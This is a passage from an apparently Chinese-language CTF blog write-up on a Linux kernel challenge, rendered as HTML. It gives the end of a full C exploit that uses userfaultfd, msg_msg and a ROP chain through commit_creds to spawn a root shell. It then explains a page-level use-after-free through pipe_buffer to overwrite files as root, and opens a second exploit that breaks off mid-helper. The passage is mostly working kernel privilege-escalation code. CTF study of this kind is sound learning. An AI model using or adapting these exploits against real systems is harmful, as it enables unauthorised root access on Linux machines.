class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;ERROR on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            err_exit(<span class="string">&quot;INCORRET EVENT in leak_handler&quot;</span>);</span><br><span class="line">        <span class="comment">// operation</span></span><br><span class="line">        info(<span class="string">&quot;hijack the kernel in userfaultfd -- hijack_handler&quot;</span>);</span><br><span class="line">        del();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(msg_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg_buf));</span><br><span class="line">        <span class="type">int</span> ret = writeMsg(msg_qid, msg_buf, <span class="number">0x400</span> - <span class="number">0x30</span>, <span class="number">0x1337</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;Write msg.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uffd_buf[<span class="number">0</span>] = heap_addr - <span class="number">0x7bc00</span> + <span class="number">0xc8</span>;</span><br><span class="line">        uffd_buf[<span class="number">1</span>] = heap_addr - <span class="number">0x7bb40</span>;</span><br><span class="line">        uffd_buf[<span class="number">2</span>] = <span class="number">0x1337</span>;</span><br><span class="line">        uffd_buf[<span class="number">3</span>] = <span class="number">0x1000</span>;</span><br><span class="line">        uffd_buf[<span class="number">4</span>] = heap_addr + <span class="number">0x300</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[<span class="number">1</span>], <span class="string">&quot;stas&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;write pipe.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[0]&quot;</span>, uffd_buf[<span class="number">0</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[1]&quot;</span>, uffd_buf[<span class="number">1</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[2]&quot;</span>, uffd_buf[<span class="number">2</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[3]&quot;</span>, uffd_buf[<span class="number">3</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[4]&quot;</span>, uffd_buf[<span class="number">4</span>]);</span><br><span class="line">        </span><br><span class="line">        uffdio_copy.src = uffd_buf;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = <span class="number">0x1000</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec ioctl for UFFDIO_COPY in leak_handler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* to exit the process normally, instead of segmentation fault */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> get_root_func = (<span class="type">size_t</span>)get_root_shell;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> data[<span class="number">0x1100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ksctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vuln.msg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(vuln.msg, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    msg_qid = getMsgQueue();</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line">    ptr = heap_addr;</span><br><span class="line">    hexx(<span class="string">&quot;ptr&quot;</span>, ptr);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> pwn;</span><br><span class="line">    <span class="type">char</span> *uffd_buf_hijack = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(uffd_buf_hijack, &amp;pwn, hijack_handler);</span><br><span class="line"></span><br><span class="line">    write(fd,uffd_buf_hijack, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (readMsg(msg_qid, data, <span class="number">0x1000</span>, <span class="number">0x1337</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;read msg.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    binary_dump(<span class="string">&quot;leak data + 0x300&quot;</span>, data + <span class="number">0x300</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;leak, &amp;data[<span class="number">0x3e8</span>], <span class="number">8</span>);</span><br><span class="line">    hexx(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line">    kernel_base = leak - <span class="number">0x101a740</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_base&quot;</span>, kernel_base);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line">    magic_gadget += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;modprobe_path&quot;</span>, modprobe_path);</span><br><span class="line">    hexx(<span class="string">&quot;magic_gadget&quot;</span>, magic_gadget);</span><br><span class="line">    </span><br><span class="line">    init_creds = kernel_base + <span class="number">0x1448cc0</span>;</span><br><span class="line">    commit_creds = kernel_base + <span class="number">0x97d00</span>;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="number">49</span>;</span><br><span class="line">    hexx(<span class="string">&quot;commit_creds&quot;</span>, commit_creds);</span><br><span class="line">    hexx(<span class="string">&quot;work_for_cpu_fn&quot;</span>, work_for_cpu_fn);</span><br><span class="line">    hexx(<span class="string">&quot;swapgs_restore_regs_and_return_to_usermode&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line"></span><br><span class="line">    pop_rdi = kernel_base + <span class="number">0xe031</span>;</span><br><span class="line">    add_rsp_188_pop_rbx_ret = kernel_base + <span class="number">0x9369cc</span>;</span><br><span class="line">    add_rsp += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;add_rsp_188_pop_rbx_ret&quot;</span>,add_rsp_188_pop_rbx_ret);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> index = <span class="number">0x20</span>;</span><br><span class="line">    payload[index++] = add_rsp;</span><br><span class="line">    payload[index++] = <span class="number">0x800000000</span>;</span><br><span class="line">    payload[index++] = ptr + <span class="number">0x400</span> + <span class="number">0x10</span>;</span><br><span class="line">    payload[index++] = magic_gadget;</span><br><span class="line">    payload[index++] = <span class="number">0</span>;</span><br><span class="line">    payload[index++] = pop_rdi;</span><br><span class="line">    payload[index++] = init_creds;</span><br><span class="line">    payload[index++] = commit_creds;</span><br><span class="line">    payload[index++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    payload[index++] = <span class="number">0</span>;</span><br><span class="line">    payload[index++] = <span class="number">0</span>;</span><br><span class="line">    payload[index++] = get_root_shell;</span><br><span class="line">    payload[index++] = user_cs;</span><br><span class="line">    payload[index++] = user_rflags;</span><br><span class="line">    payload[index++] = user_sp;</span><br><span class="line">    payload[index++] = user_ss;</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line">    write(fd, payload, <span class="number">0x180</span>);</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="求解效果-1"><a href="#求解效果-1" class="headerlink" title="求解效果"></a>求解效果</h3><img src="/2024/10/07/kno_puts/8.png" class="" title="我的图图呢">  <h2 id="userfaultfd-pipe-buffer-page-UAF"><a href="#userfaultfd-pipe-buffer-page-UAF" class="headerlink" title="userfaultfd + pipe_buffer  + page UAF"></a>userfaultfd + pipe_buffer  + page UAF</h2><h3 id="思路分析-3"><a href="#思路分析-3" class="headerlink" title="思路分析"></a>思路分析</h3><p>现在我们来假设一种比较极端的情况，我们 <code>/sys/kernel/notes</code> 给打了补丁无法泄露地址，而且题目不再给出堆地址，以及内核编译时开启了 <code>CONFIG_CFI_CLANG</code>（可以防止攻击者进行 <code>rop</code> 攻击），这个时候就需要我们的 <code>page uaf</code> 登场了！！！</p><p>这玩意我是从 a3 师傅的博客学的，十分建议每位内核爱好者去反复阅读那篇文章：<a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">【CTF.0x08】D^ 3CTF2023 d3kcache 出题手记 - arttnba3’s blog</a>，下面会借用 a3 师傅博客中的一些图片：-)</p><p>同样是利用 <code>userfaultfd</code> 来制造出 <code>uaf</code>，然后修改 <code>pipe buffer</code> 的 <code>page</code> 指针的第一个字节，使其出现两个 <code>pipe buffer</code> 指向同一个 <code>page</code> 的情况。</p><img src="/2024/10/07/kno_puts/9.png" class="" title="我的图图呢">  <p>此时释放掉其中一个 <code>pipe buffer</code>，就会直接释放掉一整个页，出现页级 <code>UAF</code> ！！！</p><img src="/2024/10/07/kno_puts/10.png" class="" title="我的图图呢">  <p>在 <code>gdb</code> 中所看到的情况如下：</p><img src="/2024/10/07/kno_puts/11.png" class="" title="我的图图呢">  <p>后面的操作就和题目的本身没有什么关系了（和用户态的 <code>house of some</code> 一样😇）。我本来的思路是将被释放的页重新取出来用于存储另一个 <code>pipe buffer</code> 数组，然后修改其中一个 <code>pipe buffer</code> 的 <code>flag</code> 为 <code>0x10</code>，实现任意文件的越权写入。可是喷了半天也没成功的命中。然后看到了 tplus 师傅的 wp，其思路更加的简单，即制造出 <code>page uaf</code> 后不断的喷射 <code>target file</code>（反复 open），然后修改 <code>file → f_mode</code>，也能实现越权写任意文件。</p><p>有了越权写任意文件后我是想着写 <code>/etc/passwd </code>文件，可是这道题目没有这个文件再加上我也不是很熟悉这个东西，于是我选着修改 <code>/sbin/poweroff</code>。应为这个文件是连接着 <code>busybox</code> 的。当 <code>qemu</code> 关闭的时候会以 <code>root</code> 权限来指向这个文件。因此我们可以将 <code>poweroff</code> 文件修改为 <code>readflag</code>，然后输入 <code>exit</code> 即可类似于用户态的 <code>orw</code> 一样获取 <code>flag</code></p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">uint64_t</span> a;</span><br><span class="line">    <span class="type">uint64_t</span> b;</span><br><span class="line">    <span class="type">uint64_t</span> c;</span><br><span class="line">    <span class="type">uint64_t</span> d;</span><br><span class="line">    <span class="type">uint64_t</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PIPE_COUNT 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SECONDARY_PIPE_COUNT 0x150</span></span><br><span class="line"><span class="type">int</span> pipe_fd[MAX_PIPE_COUNT][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> already_read[MAX_PIPE_COUNT];</span><br><span class="line"><span class="type">int</span> snd_pipe_fd[MAX_SECONDARY_PIPE_COUNT][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipes</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> cnt)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter %s start from index: %d\n&quot;</span>, __PRETTY_FUNCTION__, start);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt; cnt; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipes2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter %s\n&quot;</span>, __PRETTY_FUNCTION__);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_SECONDARY_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(snd_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(snd_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;resize pipe&quot;</span>);    </span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span 